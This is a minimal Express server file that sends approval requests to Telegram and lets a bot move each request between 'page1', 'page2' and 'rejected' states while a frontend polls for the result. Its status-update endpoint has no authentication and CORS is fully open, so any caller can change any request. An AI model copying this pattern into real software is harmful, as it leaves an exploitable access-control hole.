// server.js (minimal)
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const crypto = require("crypto");
const { sendApprovalButtons } = require("./bot");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

// requestId -> { status: "pending"|"page1"|"page2"|"rejected" }
const pending = {};

app.get("/", (req, res) => res.send("✅ Server running."));

// Create a new approval request
app.post("/create-request", async (req, res) => {
  const requestId = crypto.randomUUID();
  pending[requestId] = { status: "pending" };

  // Optional label shown in Telegram
  const label = (req.body.label || "New request").toString();

  try {
    await sendApprovalButtons(requestId, label);
  } catch (e) {
    console.error("❌ Telegram send failed:", e);
  }

  res.json({ ok: true, requestId });
});

// Frontend polls this
app.get("/check-status", (req, res) => {
  const requestId = (req.query.requestId || "").trim();
  if (!requestId || !pending[requestId]) return res.json({ status: "unknown" });
  res.json({ status: pending[requestId].status });
});

// Bot calls this
app.post("/update-status", (req, res) => {
  const requestId = (req.body.requestId || "").trim();
  const status = req.body.status;

  if (!requestId || !pending[requestId]) return res.json({ ok: false, message: "Request not found" });

  pending[requestId].status = status;
  res.json({ ok: true });
});

app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
